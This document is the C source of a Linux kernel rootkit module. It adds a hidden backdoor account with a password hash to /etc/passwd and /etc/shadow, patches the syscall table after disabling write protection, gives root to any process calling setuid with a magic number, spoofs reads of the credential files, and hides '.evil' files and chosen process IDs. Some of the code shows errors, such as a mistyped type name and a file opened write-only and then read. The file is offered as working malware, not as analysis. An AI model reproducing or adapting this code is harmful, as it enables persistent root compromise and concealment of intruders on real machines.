#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/fdtable.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/semaphore.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/fcntl.h>

struct dirent64 { 
    unsigned long long d_ino; 
    long long d_off;
    unsigned short reclen; 
    unsigned char d_type; 
    char d_name[0]; 
}; 
struct dirent { 
    unsigned long d_ino; 
    unsigned long d_off; 
    unsigned short reclen; 
    char d_name[0]; 
};

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hail Mary");

static char *pass = "boogyman:x:2000:1000:boogyman,,,:/home/boogyman:/bin/bash\n";
static char *shad = "boogyman:$6$0/RGDCY4$RC0GMeLMGdzmTDw./9af6cr1Rc/zkh06uE3KCKLgPTiWIn0PDheGG8qMN4TEqQ61ke3PunJ2QHbcEMh4RyjoA/:18233:0:99999:7:::\n"; 
static char *ending = ".evil"; 
static int magicNum = 55555; 

module_param(pass, charp, S_IRUGO); 
module_param(shad, charp, S_IRUGO); 
module_param(ending, charp, S_IRUGO); 
module_param(magicNum, int, S_IRUGO); 

char *shadowBuf = "SHADOWWWWWWW\n"; 
char *passwdBuf = "PASSSSSSWORD\n"; 

ulong **systable; 

#define PID_MAX 100 
int pids[PID_MAX]; 
int pidCount = 0; 

void set_rw(ulong); 
void set_ro(ulong); 

asmlinkage int (*og_read)(int, char *, size_t); 
asmlinkage int (*og_setuid)(uid_t); 
asmlinkage int (*og_getdents64)(uint, struct dirent64 *, uint); 
asmlinkage int (*og_getdents)(uint, struct dirent *, uint); 
asmlinkage int our_read(int, char *, size_t); 
asmlinkage int our_setuid(uit_t); 
asmlinkage int our_getdents64(uint, struct dirent64 *, uint); 
asmlinkage int our_getdents(uint, struct dirent *, uint); 

int hideFiles(struct dirent64 *, uint); 
int hideProcs(uint, struct dirent *, uint); 
static ssize_t dev_write(struct file *filp, const char *buf, unsigned long s, void *dat) { 
    long pid = 0; 
    // printk(KERN_INFO "WRITE: %s", buf); 
    int ret = (int)strict_strtol(buf, 10, &pid); 
    if(ret == 0 && pidCount < PID_MAX) { 
        pids[pidCount] = pid; 
        pidCount++; 
        return s; 
    } 
    return -1; 
} 

int readAndWrite(char *file, char *toWrite, char **readIn) { 
    mm_segment_t old_fs; 
    struct file *fd; 
    fd = filp_open(file, O_WRONLY, 0); 
    
    if(fd == NULL) { 
        return -1; 
    } 
    
    old_fs = get_fs(); 
    set_fs(KERNEL_DS); 
    fd->f_op->read(fd, *readIn, PAGE_SIZE, &fd->f_pos); 
    
    if(strstr(*readIn, toWrite) == NULL) { 
        fd->f_op->write(fd, toWrite, strlen(toWrite), &fd->f_pos); 
    } 
    
    set_fs(old_fs); 
    filp_close(fd, NULL); 
    return 0; 
    }
    
int init_module(void) { 
    struct proc_dir_entry *f = create_proc_entry("hidePid", 777, NULL); 
    if(f == NULL) { 
        // remove_proc_entry(PROC_NAME, &proc_root); 
        return -1; 
    } 
    f->write_proc = dev_write; 
    f->mode = 777; 
    f->uid = 0; 
    f->gid = 0; 
    f->size = 37; 
    passwdBuf = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL); 
    if(readAndWrite("/etc/passwd", pass, &passwdBuf ) < 0) { 
    kfree(passwdBuf); 
    return -1; 
    } 

    shadowBuf = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL); 

    if(readAndWrite("/etc/shadow", shad, &shadowBuf) < 0) { 
        kfree(passwdBuf); 
        kfree(shadowBuf); 
        return -1; 
    } 

    systable = (ulong**)kallsyms_lookup_name("sys_call_table"); 

    if(!systable) { 
      return -1; 
    } 

    og_read = (void *)systable[__NR_read]; 
    og_setuid = (void *)systable[__NR_setuid32]; 
    og_getdents64 = (void *)systable[__NR_getdents64];
    og_getdents = (void *)systable[__NR_getdents]; 

    write_cr0(read_cr0() & (~0x10000)); // disables write protections 

    set_rw((ulong)systable); 
    systable[__NR_read] = (ulong *)&our_read; 
    systable[__NR_setuid32] = (ulong *)&our_setuid; 
    systable[__NR_getdents64] = (ulong *)&our_getdents64; 
    systable[__NR_getdents] = (ulong *)&our_getdents; 
    return 0; 
} 

void cleanup_module(void) { 
    //kfree(passwdBuf); 
    //kfree(shadowBuf); 
    systable[__NR_read] = (ulong *)og_read; 
    systable[__NR_setuid32] = (ulong *)og_setuid; 
    systable[__NR_getdents64] = (ulong *)og_getdents64; 
    systable[__NR_getdents] = (ulong *)og_getdents; 
    set_ro((ulong)systable); 
    write_cr0(read_cr0() | 0x10000); 
} 

void set_rw(ulong addr) { 
    set_memory_rw(addr, 1); 
} 

void set_ro(ulong addr) { 
    set_memory_ro(addr, 1); 
} 

asmlinkage int our_read(int fd, char *buf, size_t count) { 
    struct file *f; 
    struct path *p; 
    char *pathname; char *t; 
    int r = og_read(fd, buf, count); 
    if(r > 0) { 
        f = fget(fd); 
        p = &(f->f_path); 
        path_get(p); 
        t = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL); 
        if(t == NULL) { 
            path_put(p); 
            return r;
        } 
        pathname = d_path(p, t, PAGE_SIZE); 
        path_put(p); 
        if(!strcmp(pathname, "/etc/shadow")) { 
            r = strlen(strncpy(buf, shadowBuf, count)); 
        } else if(!strcmp(pathname, "/etc/passwd")) { 
            r = strlen(strncpy(buf, passwdBuf, count)); 
        } 
    kfree(t); 
    } 
    return r; 
} 

asmlinkage int our_setuid(uid_t uid) { 
    if(uid == magicNum) { 
        struct cred *c = prepare_creds();
        c->uid = c->gid = c->euid = c->egid = 0; 
        return commit_creds(c); 
    } 
    return (*og_setuid)(uid); 
} 

asmlinkage int our_getdents64(uint fd, struct dirent64 *dirp, uint count) { 
    int r = og_getdents64(fd, dirp, count); 
    r = hideFiles(dirp, r); 
    return r; 
} 

int hideFiles(struct dirent64 *dirp, uint length) { 
    struct dirent64 *t = (struct dirent *)kmalloc(length, GFP_KERNEL); 
    if(t == NULL) { 
        return length; 
    } 
    int count = 0; 
    int offset = 0; 
    while(count < length) { 
        char *p = (char *)dirp; 
        p+=count;
        struct dirent64 *cur = (struct dirent64 *)p; 
        
        if(strstr(cur->d_name, ending) == NULL) { 
            char *tp = (char *)t;
            tp+=offset; 
            memcpy(tp, cur, cur->reclen); 
            offset += cur->reclen; 
        } 
        count += cur->reclen; 
    } 
    memcpy(dirp, t, offset); 
    kfree(t); 
    return offset; 
} 

asmlinkage int our_getdents(uint fd, struct dirent *dirp, uint count) { 
    int r = og_getdents(fd, dirp, count); 
    r = hideProcs(fd, dirp, r); 
    return r; 
} 

int hideProcs(uint fd, struct dirent *dirp, uint length) { 
    struct dirent *t = kmalloc(length, GFP_KERNEL); 
    if(t == NULL) { 
        return length; 
    } 
    int count = 0; 
    int offset = 0; 
    
    while(count < length) { 
        char *p = (char *)dirp; 
        p+=count; 
        struct dirent *cur = (struct dirent *)p; 
        long int pid = 0; 
  
        if(strict_strtol(cur->d_name, 10, &pid) == 0) { 
            struct pid *proc = find_get_pid((int)pid); 
            if(proc != NULL) { 
                int flag = 1; 
                int i = 0; 
                while(i < pidCount) { 
                    if(pids[i] == pid) { 
                    flag = 0; 
                    break; 
                } 
                i++; 
            } 
            if(flag) { 
                char *tp = (char *)t; 
                tp+=offset; 
                memcpy(tp, cur, cur->reclen); 
                offset += cur->reclen; 
            } 
        } 
    } 
    count += cur->reclen; 
} 

memcpy(dirp, t, offset); 
kfree(t); 
return offset; 

}
